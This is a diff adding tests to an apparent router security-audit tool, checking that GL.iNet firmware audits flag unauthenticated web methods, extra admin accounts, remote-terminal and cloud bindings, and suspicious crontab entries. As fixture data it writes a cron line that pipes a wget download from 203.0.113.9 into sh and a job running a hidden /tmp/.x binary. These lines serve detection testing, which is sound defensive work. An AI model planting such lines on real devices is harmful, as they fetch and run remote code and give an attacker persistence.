@@ -14,6 +14,8 @@ import unittest
 import mcp_client
 from mcp_client import OpenWrtTestCase
 from test_forensics import ED_BLOB, ED_LINE, MAKE_ROM, MAKE_UPPER, ROM_DIR, UPPER_DIR, fingerprint
+from test_glinet import GL_CHANGED, GL_RESET, GL_SETUP
+from test_glinet import PROC_DIR as GL_PROC
 
 PROC_DIR = "/fixture/proc"
 ROM = {"MCP_ROM": ROM_DIR}
@@ -826,6 +828,103 @@ class TestNativeProcesses(AuditCase):
         for check in ("integrity.process_not_from_image", "integrity.process_tmp_binary", "integrity.process_deleted_binary"):
             self.assertNotIn(check, found)
         self.assertNotIn("processes point at a program path that does not exist", text)
+
+
+class TestAuditGLiNet(AuditCase):
+    """GL.iNet firmware: the checks of the GL web server, cloud and remote terminal, and
+    the live crontab /tmp/gl_crontabs that GL's crond reads. The fixture is the one of
+    test_glinet: stock GL configuration in live system and image, crond in MCP_PROC."""
+
+    SETUP = GL_SETUP + SET_ROOT_PW
+    ENV = {"MCP_ROM": ROM_DIR, "MCP_PROC": GL_PROC}
+    STOCK_CRON = r"""printf '* * * * * /usr/bin/auto_timezone\n* * * * * sleep 10; /usr/bin/auto_timezone\n*/1 * * * * . /lib/functions/mptun.sh; get_arp_scan_ret\n' > /tmp/gl_crontabs/root"""
+
+    def test_stock_firmware_raises_nothing_above_low(self):
+        text, found = self.audit(self.ENV)
+        loud = {c: s for c, (s, _) in found.items() if s in ("HIGH", "MEDIUM")}
+        self.assertFalse(loud, f"stock GL.iNet output flagged: {loud}")
+        self.assertFinding(found, "persistence.live_crontab_firmware", "INFO",
+                           "/tmp/gl_crontabs/root line 1: * * * * * /usr/bin/auto_timezone",
+                           "/tmp/gl_crontabs/root line 2: * * * * * sleep 10; /usr/bin/auto_timezone",
+                           "/tmp/gl_crontabs/root line 3: */1 * * * * . /lib/functions/mptun.sh; get_arp_scan_ret")
+        clean = text.split("== Checked, nothing found")[1].split("==")[0]
+        for check in ("exposure.gl_remote_terminal", "exposure.gl_cloud_bound", "auth.gl_no_auth_methods",
+                      "auth.gl_console_login", "persistence.live_crontab "):
+            self.assertIn(check, clean + " ")
+        self.assertIn("- auth.gl_admin_accounts: no /etc/oui/oui.db", text.split("== Could not check")[1])
+
+    def test_gl_checks_fire(self):
+        self.sh(GL_CHANGED)
+        try:
+            text, found = self.audit(self.ENV, categories=["exposure", "auth"])
+            self.assertFinding(found, "auth.gl_no_auth_methods", "HIGH",
+                               "/etc/config/oui-httpd: system.reboot runs without login; the image does not list it")
+            self.assertNotIn("get_lang", found["auth.gl_no_auth_methods"][1])
+            self.assertFinding(found, "auth.gl_admin_accounts", "MEDIUM", "/etc/oui/oui.db account 'bob' (acl admin)")
+            self.assertNotIn("'root'", found["auth.gl_admin_accounts"][1])
+            self.assertFinding(found, "exposure.gl_remote_terminal", "MEDIUM",
+                               "rtty process pid 4100 (rtty): /usr/sbin/rtty -I dev42 -h relay.example",
+                               "-t <redacted>", "rtty.general.ssh_en='1'")
+            self.assertFinding(found, "exposure.gl_cloud_bound", "LOW", "username 'owner', email 'owner@example.com'",
+                               "bindtime '1700000000'")
+            self.assertFinding(found, "auth.gl_console_login", "LOW",
+                               "oui-httpd.main.console_disabled='0' (image: '1')")
+            self.assertNotIn("rttytoken31", text)
+            self.assertNotIn("cloudtoken42", text)
+        finally:
+            self.sh(GL_RESET)
+
+    def test_missing_data_is_said(self):
+        self.sh("mkdir -p /etc/oui && echo x > /etc/oui/oui.db && mv /etc/glversion /etc/glversion.off")
+        try:
+            text, _ = self.audit(self.ENV, categories=["exposure", "auth"])
+            tail = text.split("== Could not check")[1]
+            self.assertIn("- auth.gl_no_auth_methods, auth.gl_admin_accounts, auth.gl_console_login: "
+                          "not GL.iNet firmware (no /etc/glversion)", tail)
+            self.assertIn("- exposure.gl_remote_terminal, exposure.gl_cloud_bound: not GL.iNet firmware", tail)
+            self.sh("mv /etc/glversion.off /etc/glversion")
+            text, _ = self.audit({"MCP_PROC": GL_PROC}, categories=["auth"])
+            tail = text.split("== Could not check")[1]
+            self.assertIn("- auth.gl_admin_accounts: sqlite3: not available", tail)
+            self.assertIn("- auth.gl_no_auth_methods, auth.gl_console_login: no oui-httpd configuration in a usable "
+                          "firmware image", tail)
+        finally:
+            self.sh("rm -rf /etc/oui; [ -f /etc/glversion ] || mv /etc/glversion.off /etc/glversion")
+
+    def test_live_crontab_lines(self):
+        self.sh("printf '#!/bin/sh\\nid\\n' > /usr/bin/gl-extra && chmod 755 /usr/bin/gl-extra && "
+                "echo '0 2 * * * /usr/bin/gl-extra' >> /tmp/gl_crontabs/root")
+        try:
+            _, found = self.audit(self.ENV, categories=["persistence"])
+            self.assertFinding(found, "persistence.live_crontab", "LOW",
+                               "/tmp/gl_crontabs/root line 4: 0 2 * * * /usr/bin/gl-extra  <- /usr/bin/gl-extra: "
+                               "not in the firmware image")
+            self.assertEqual(found["persistence.live_crontab"][1].count("    - "), 1)
+            self.assertNotIn("gl-extra", found["persistence.live_crontab_firmware"][1])
+            self.sh(r"""cat >> /tmp/gl_crontabs/root <<'EOF'
+*/5 * * * * /tmp/.x/run
+0 * * * * wget -qO- http://203.0.113.9/p | sh
+0 1 * * * notthere --flag >/dev/null 2>&1
+0 3 * * * /usr/bin/gl-extra --password=cronsecret44
+0 5 * * * /usr/bin/update-check
+EOF
+echo '0 5 * * * /usr/bin/update-check' > /etc/crontabs/root""")
+            text, found = self.audit(self.ENV, categories=["persistence"])
+            self.assertFinding(found, "persistence.live_crontab", "MEDIUM",
+                               "line 5: */5 * * * * /tmp/.x/run  <- /tmp/.x/run: /tmp/.x/run is on the RAM disk and "
+                               "does not exist now",
+                               "line 6: 0 * * * * wget -qO- http://203.0.113.9/p | sh  <- downloads or pipes into a shell",
+                               "line 7: 0 1 * * * notthere --flag >/dev/null 2>&1  <- notthere: not found in /usr/sbin",
+                               "line 8: 0 3 * * * /usr/bin/gl-extra --password=<redacted>  <- /usr/bin/gl-extra: not in")
+            self.assertNotIn("cronsecret44", text)
+            # a line that also stands in /etc/crontabs is reported there, once
+            self.assertEqual(text.count("update-check"), 1)
+            self.assertIn("update-check", found["persistence.user_autostart"][1])
+            self.sh("mkdir -p /tmp/.x && printf '#!/bin/sh\\nid\\n' > /tmp/.x/run && chmod 755 /tmp/.x/run")
+            _, found = self.audit(self.ENV, categories=["persistence"])
+            self.assertIn("/tmp/.x/run  <- /tmp/.x/run: /tmp/.x/run is on the RAM disk\n", found["persistence.live_crontab"][1])
+        finally:
+            self.sh(self.STOCK_CRON + "; rm -rf /usr/bin/gl-extra /tmp/.x /etc/crontabs/root")
 
 
 if __name__ == "__main__":
